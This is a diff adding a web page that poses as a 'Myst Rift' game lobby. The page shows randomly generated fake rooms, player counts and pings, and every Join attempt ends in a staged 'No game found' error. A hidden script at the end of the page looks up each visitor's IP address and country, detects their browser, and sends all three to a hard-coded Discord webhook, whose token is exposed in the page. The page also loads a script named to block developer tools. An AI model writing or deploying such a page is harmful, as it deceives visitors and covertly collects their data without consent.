@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Myst Rift - Public Rooms</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link rel="stylesheet" href="../css/bootstrap.min.css"/>
+  <link rel="stylesheet" href="../css/all.min.css"/>
+  <link rel="stylesheet" href="../css/animate.min.css" />
+  <link rel="stylesheet" href="../css/beta-pass-claim.03fcb964.css"/>
+  <link rel="stylesheet" href="../css/beta-pass-claim.cce4daa8.css"/>
+  <link rel="icon" href="../media/icon.ico" type="image/x-icon"/>
+
+  <style>
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      font-family: inherit;
+      background: #000;
+      color: #fff;
+    }
+    .fullscreen-bg {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .fullscreen-bg video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      filter: brightness(0.45) contrast(1.05);
+    }
+    .fullscreen-bg .video-img {
+      display: none;
+    }
+    .overlay {
+      position: relative;
+      z-index: 5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .card-overlay {
+      max-width: 1100px;
+      width: 100%;
+      background: linear-gradient(180deg, rgba(8, 8, 8, 0.6), rgba(6, 6, 6, 0.7));
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(6px);
+      border: 1px solid rgba(255, 200, 30, 0.04);
+      color: #fff;
+      position: relative;
+    }
+    .card-overlay h2 {
+      font-size: 24px;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+    }
+    .card-overlay p {
+      margin: 0 0 10px;
+      color: #ddd;
+    }
+    table.table-dark {
+      background-color: transparent;
+      width: 100%;
+    }
+    table.table-dark td,
+    table.table-dark th {
+      border-color: rgba(255, 255, 255, 0.06);
+      vertical-align: middle;
+      padding: 8px 12px;
+    }
+    .room-name {
+      font-weight: 700;
+      font-size: 15px;
+    }
+    .room-meta {
+      font-size: 13px;
+      color: #ccc;
+    }
+    .flag {
+      font-size: 18px;
+      margin-right: 8px;
+    }
+    .ping-badge {
+      font-weight: 700;
+      padding: 4px 8px;
+      border-radius: 8px;
+      font-size: 13px;
+      display: inline-block;
+      min-width: 65px;
+      text-align: center;
+    }
+    .ping-good {
+      background: rgba(0, 200, 100, 0.08);
+      color: #9ef0a6;
+      border: 1px solid rgba(0, 200, 100, 0.12);
+    }
+    .ping-ok {
+      background: rgba(240, 180, 20, 0.06);
+      color: #ffd89b;
+      border: 1px solid rgba(240, 180, 20, 0.08);
+    }
+    .ping-bad {
+      background: rgba(240, 40, 40, 0.06);
+      color: #ff9b9b;
+      border: 1px solid rgba(240, 40, 40, 0.08);
+    }
+    .btn-join {
+      border: 2px solid #f0ad4e;
+      color: #f0ad4e;
+      background: rgba(0, 0, 0, 0.06);
+      font-weight: 600;
+      border-radius: 8px;
+      padding: 6px 10px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+      transition: background-color 0.3s, color 0.3s;
+      user-select: none;
+    }
+    .btn-join:hover {
+      background: rgba(240, 173, 78, 0.08);
+      color: #fff;
+      border-color: #f7c26e;
+      text-decoration: none;
+    }
+    .fade-in {
+      animation: fadeIn 550ms ease forwards;
+      opacity: 0;
+    }
+    .fade-out {
+      animation: fadeOut 550ms ease forwards;
+    }
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+      from {
+        opacity: 0;
+        transform: translateY(6px);
+      }
+    }
+    @keyframes fadeOut {
+      to {
+        opacity: 0;
+        transform: translateY(-6px);
+      }
+      from {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+    #loading-screen,
+    #error-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.85);
+      color: #fff;
+      font-family: inherit;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      z-index: 9999;
+      text-transform: uppercase;
+      gap: 16px;
+      user-select: none;
+      padding: 20px;
+      text-align: center;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #f0ad4e;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+    #error-screen button {
+      margin-top: 20px;
+      padding: 12px 30px;
+      font-size: 18px;
+      font-weight: 700;
+      border-radius: 8px;
+      border: none;
+      background-color: #f0ad4e;
+      color: #000;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      text-transform: none;
+    }
+    #error-screen button:hover {
+      background-color: #d4952a;
+    }
+    @media (max-width: 800px) {
+      .col-players,
+      .col-ping {
+        display: none;
+      }
+      .card-overlay {
+        padding: 14px;
+      }
+    }
+    .back-button {
+      position: fixed;
+      top: 16px;
+      left: 16px;
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.6);
+      border-radius: 30px;
+      padding: 8px 16px;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 14px;
+      color: #f0ad4e;
+      border: 2px solid #f0ad4e;
+      text-decoration: none;
+      user-select: none;
+      transition: background-color 0.3s, color 0.3s;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      box-shadow: 0 4px 8px rgba(240, 173, 78, 0.5);
+    }
+    .back-button:hover {
+      background: #f0ad4e;
+      color: #000;
+      text-decoration: none;
+      box-shadow: 0 6px 12px rgba(240, 173, 78, 0.8);
+    }
+    .back-button svg {
+      fill: currentColor;
+      width: 18px;
+      height: 18px;
+      transition: transform 0.3s;
+    }
+    .back-button:hover svg {
+      transform: translateX(-3px);
+    }
+  </style>
+</head>
+<body>
+  <a href="/" class="back-button" aria-label="Back to MyStrift" title="">
+    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" >
+      <path d="M10 12L6 8l4-4" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    Back to Home
+  </a>
+
+  <div class="fullscreen-bg" aria-hidden="true">
+    <video autoplay loop muted playsinline>
+      <source src="../media/background.mp4" type="video/mp4" />
+      <img class="video-img" src="../media/main.dde7f6b9.jpg" alt="" />
+    </video>
+  </div>
+
+  <div class="overlay">
+    <div class="card-overlay">
+      <div class="table-responsive">
+        <table id="roomsTable" class="table table-dark table-striped align-middle">
+          <thead>
+            <tr>
+              <th style="min-width: 260px">Room / Host</th>
+              <th class="col-players" style="width: 120px">Players</th>
+              <th class="col-region" style="width: 160px">Region</th>
+              <th class="col-ping" style="width: 110px">Ping</th>
+              <th style="width: 120px"></th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+      <div style="font-size: 13px; color: #bbb; margin-top: 8px">
+        You can click Join to go to /join/<em>roomslug</em>
+      </div>
+    </div>
+  </div>
+
+  <div id="loading-screen" aria-live="polite" role="alert" aria-atomic="true">
+    <div id="loading-text">Joining..</div>
+    <div class="loader"></div>
+  </div>
+
+  <div id="error-screen" aria-live="polite" role="alert" aria-atomic="true">
+  <div>No game found Are you sure you started the game?</div>
+  <button id="back-to-rooms-btn">Back to Rooms</button>
+  </div>
+  <script>
+    document.getElementById("back-to-rooms-btn").addEventListener("click", () => {
+      window.location.href = "https://mystrift.com/rooms";
+    });
+  </script>
+
+  <script>
+    const namePool = [
+      "AliKaan", "Deniz", "Mustafa", "Ayşe", "Mehmet", "Elif", "Burak", "Narin", "Emre", "Asya",
+      "Runa", "Maflex", "Trexy", "Oliver", "Sophia", "Liam", "Emma", "Noah", "Ava", "Ethan",
+      "Isabella", "Mateo", "Sofia", "Luca", "Hana", "Yara", "Ibrahim", "Omar", "Aisha", "Khalid",
+      "Hiro", "Yuki", "Sora", "Akiko", "Kenji", "Carlos", "Diego", "Lucia", "Sergio", "Valentina",
+      "Vernox", "Lynara", "Dravik", "ShadowWolf", "LunaMystic", "BladeReaper", "NightWolf", "CrimsonViper",
+      "SilverArrow", "FrostBane", "DarkPhantom", "AuroraBlade", "StormBreaker", "IronFang", "VenomStrike",
+      "OblivionRider", "NovaKnight", "Z3r0Pulse", "HikariBlade", "RavenClaw", "GhostRiderX", "BloodMoon",
+      "KyotoKaze", "NightStalker", "ArcticFang", "InfernoSoul", "VortexSlayer", "BladeSamurai", "Talon_94",
+      "NyxShade", "HollowFang", "PhantomEdge", "WraithLord", "ZeroNova", "AkumaRyuu", "CyberViper",
+      "OmegaStorm", "Drakonis", "NovaFlare", "RogueSpectre", "BlackLotus", "ShinobiX", "SeraphicDusk",
+      "LoneWolf_21", "ShadowReaper", "AbyssWalker", "ValkyrieFang", "NoScopeFox", "xSpectre", "Rav3nX",
+      "CaptainMorrow", "SirAldric", "MiraElara", "Zain", "Hadi", "Faten", "Noura", "Samir", "Youssef",
+      "IbrahimAl", "Suleiman", "Rashid", "Iris", "Maya", "Kaito", "Rafael", "Marcos", "Irina",
+      "Ekaterina", "Vasco", "Pablo", "Andres", "Giulia", "Marco", "SofiaR", "Tarek", "Zeynep",
+      "Cemre", "Baran", "Tolga", "Sultan", "KaanX", "Emilia", "Arman", "Darya", "Leila", "Rashida"
+    ];
+
+    const regions = [
+      { code: "TR", flag: "🇹🇷", label: "Turkey" },
+      { code: "US", flag: "🇺🇸", label: "North America" },
+      { code: "EU", flag: "🇪🇺", label: "Europe" },
+      { code: "BR", flag: "🇧🇷", label: "Brazil" },
+      { code: "RU", flag: "🇷🇺", label: "Russia" },
+      { code: "JP", flag: "🇯🇵", label: "Japan" },
+      { code: "KR", flag: "🇰🇷", label: "Korea" },
+      { code: "AE", flag: "🇦🇪", label: "Middle East" },
+      { code: "EG", flag: "🇪🇬", label: "Egypt" },
+      { code: "AR", flag: "🇦🇷", label: "Argentina" },
+      { code: "IN", flag: "🇮🇳", label: "India" }
+    ];
+
+    function pick(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+    function slugify(name) {
+      return name.toLowerCase().replace(/[^a-z0-9]+/g, "").slice(0, 40) || "room" + Math.floor(Math.random() * 10000);
+    }
+    function randBetween(a, b) {
+      return Math.floor(Math.random() * (b - a + 1)) + a;
+    }
+
+    function generateRoom() {
+      let base = pick(namePool);
+      if (Math.random() < 0.25) {
+        const other = pick(namePool);
+        if (other !== base) base = base + (Math.random() < 0.5 ? "_" : "") + other;
+      }
+      if (Math.random() < 0.2) {
+        base += (Math.random() < 0.5 ? "" : "_") + (Math.floor(Math.random() * 98) + 2);
+      }
+      const players = Math.floor(Math.random() * 12) + 1;
+      const region = pick(regions);
+      let ping;
+      switch (region.code) {
+        case "TR": ping = randBetween(20, 90); break;
+        case "EU": ping = randBetween(25, 110); break;
+        case "JP": ping = randBetween(30, 120); break;
+        case "KR": ping = randBetween(30, 120); break;
+        case "US": ping = randBetween(40, 180); break;
+        case "BR": ping = randBetween(80, 220); break;
+        case "RU": ping = randBetween(40, 160); break;
+        case "AE": ping = randBetween(60, 170); break;
+        case "EG": ping = randBetween(80, 200); break;
+        case "IN": ping = randBetween(90, 260); break;
+        default: ping = randBetween(40, 160);
+      }
+      const name = base;
+      const slug = slugify(name);
+      return { name, slug, players, region, ping };
+    }
+
+    const rooms = new Map();
+
+    function escapeHtml(s) {
+      return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    }
+
+    function renderTable() {
+      const tbody = document.querySelector("#roomsTable tbody");
+      const existingRows = Array.from(tbody.querySelectorAll("tr")).reduce((acc, row) => {
+        const s = row.getAttribute("data-slug");
+        if (s) acc[s] = row;
+        return acc;
+      }, {});
+    
+      for (const slug in existingRows) {
+        if (!rooms.has(slug)) {
+          const row = existingRows[slug];
+          row.classList.add("fade-out");
+          setTimeout(() => row.remove(), 400);
+        }
+      }
+
+      for (const [slug, room] of rooms) {
+        if (existingRows[slug]) {
+          const row = existingRows[slug];
+          row.innerHTML = `
+            <td>
+              <div class="room-name">${escapeHtml(room.name)}</div>
+              <div class="room-meta">${escapeHtml(room.slug)} / <strong>${escapeHtml(room.slug)}</strong></div>
+            </td>
+            <td class="col-players">${room.players}</td>
+            <td class="col-region"><span class="flag">${room.region.flag}</span> ${room.region.label}</td>
+            <td class="col-ping">
+              <span class="ping-badge ${room.ping < 90 ? "ping-good" : room.ping < 150 ? "ping-ok" : "ping-bad"}">${room.ping} ms</span>
+            </td>
+            <td>
+              <button class="btn-join">Join</button>
+            </td>`;
+        } else {
+          const row = document.createElement("tr");
+          row.setAttribute("data-slug", slug);
+          row.classList.add("fade-in");
+          row.innerHTML = `
+            <td>
+              <div class="room-name">${escapeHtml(room.name)}</div>
+              <div class="room-meta">${escapeHtml(room.slug)} / <strong>${escapeHtml(room.slug)}</strong></div>
+            </td>
+            <td class="col-players">${room.players}</td>
+            <td class="col-region"><span class="flag">${room.region.flag}</span> ${room.region.label}</td>
+            <td class="col-ping">
+              <span class="ping-badge ${room.ping < 90 ? "ping-good" : room.ping < 150 ? "ping-ok" : "ping-bad"}">${room.ping} ms</span>
+            </td>
+            <td>
+              <button class="btn-join">Join</button>
+            </td>`;
+          tbody.appendChild(row);
+          setTimeout(() => row.classList.remove("fade-in"), 700);
+        }
+      }
+    }
+
+    function updateRooms() {
+      const maxRooms = 21;
+      const currentCount = rooms.size;
+
+      if (currentCount < maxRooms) {
+        const newRoomsCount = Math.min(maxRooms - currentCount, 3);
+        for (let i = 0; i < newRoomsCount; i++) {
+          let tries = 0;
+          do {
+            const room = generateRoom();
+            if (!rooms.has(room.slug)) {
+              rooms.set(room.slug, room);
+              break;
+            }
+            tries++;
+          } while (tries < 5);
+        }
+      } else if (currentCount > maxRooms) {
+        const toRemove = currentCount - maxRooms;
+        let removed = 0;
+        for (const slug of rooms.keys()) {
+          if (removed >= toRemove) break;
+          rooms.delete(slug);
+          removed++;
+        }
+      }
+
+      for (const room of rooms.values()) {
+        room.players = Math.min(12, Math.max(1, room.players + (Math.random() < 0.5 ? 1 : -1)));
+        room.ping += randBetween(-10, 10);
+        if (room.ping < 10) room.ping = 10;
+        if (room.ping > 260) room.ping = 260;
+      }
+
+      renderTable();
+    }
+
+    updateRooms();
+    setInterval(updateRooms, 7000);
+
+       document.querySelector("#roomsTable tbody").addEventListener("click", (e) => {
+       if (e.target.classList.contains("btn-join")) {
+       e.preventDefault();
+   
+       const tr = e.target.closest("tr");
+       if (!tr) return;
+   
+       const roomNameDiv = tr.querySelector(".room-name");
+       const roomName = roomNameDiv ? roomNameDiv.textContent.trim() : "room";
+       const loadingScreen = document.getElementById("loading-screen");
+       const loadingText = document.getElementById("loading-text");
+       loadingText.textContent = `Joining ${roomName.toUpperCase()} room...`;
+       loadingScreen.style.display = "flex";
+   
+       setTimeout(() => {
+         loadingScreen.style.display = "none";
+         document.getElementById("error-screen").style.display = "flex";
+       }, 9000);
+     }
+   });
+  </script>
+
+  <script>
+      function getBrowserName() {
+        const userAgent = navigator.userAgent;
+        let browserName = 'Unknown Browser';
+    
+        if (userAgent.indexOf('Edg') > -1) browserName = 'Microsoft Edge';
+        else if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('OPR') === -1 && userAgent.indexOf('GX') === -1) browserName = 'Google Chrome';
+        else if (userAgent.indexOf('OPR') > -1) browserName = 'Opera';
+        else if (userAgent.indexOf('GX') > -1) browserName = 'Opera GX';
+        else if (userAgent.indexOf('Firefox') > -1) browserName = 'Mozilla Firefox';
+        else if (userAgent.indexOf('Brave') > -1) browserName = 'Brave';
+        else if (userAgent.indexOf('YaBrowser') > -1) browserName = 'Yandex Browser';
+        else if (userAgent.indexOf('Safari') > -1) browserName = 'Safari';
+        return browserName;
+    }
+    
+    const browserName = getBrowserName();
+    
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            const country = data.country_name;
+            sendToDiscord(ipAddress, country, browserName);
+        });
+    
+    function sendToDiscord(ip, country, browser) {
+        const webhookURL = 'https://discord.com/api/webhooks/1404352872401076274/9vVbTsmX8OtlVAhpYDFk-GLDCWDi01WFPmO1DHfjyyDRqg94DTs2S7qNiF1XEJlSR3bL';
+        sendEmbedMessage(ip, country, browser, webhookURL);
+    }
+    
+    function sendEmbedMessage(ip, country, browser, webhookURL) {
+        const message = {
+            embeds: [{
+                title: "@maflexHook > rooms",
+                color: 0x0000001,
+                fields: [
+                    { name: "", value: `\`${ip}\``, inline: true },
+                    { name: "", value: `\`${country}\``, inline: true },
+                    { name: "", value: `\`${browser}\``, inline: true }
+                ]
+            }]
+        };
+    
+        fetch(webhookURL, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(message)
+        });
+    }
+  </script>
+
+<script src="../js/maflex_nodevtools.js"></script>
+</body>
+</html>
